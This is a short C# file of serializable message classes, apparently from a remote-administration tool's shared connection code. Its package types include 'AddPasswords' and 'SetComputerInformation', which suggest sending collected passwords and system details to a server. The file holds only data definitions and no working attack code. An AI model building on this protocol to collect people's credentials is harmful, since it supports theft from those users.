using System;

namespace Orcus.Shared.Connection
{
    [Serializable]
    public class ServerPackage
    {
        public ServerPackageType ServerPackageType { get; set; }
        public byte[] Data { get; set; }
        public RedirectPackage RedirectPackage { get; set; }
    }

    [Serializable]
    public class RedirectPackage
    {
        public ushort Administration { get; set; }
    }

    [Serializable]
    public enum ServerPackageType
    {
        AddPasswords,
        SetComputerInformation
    }
}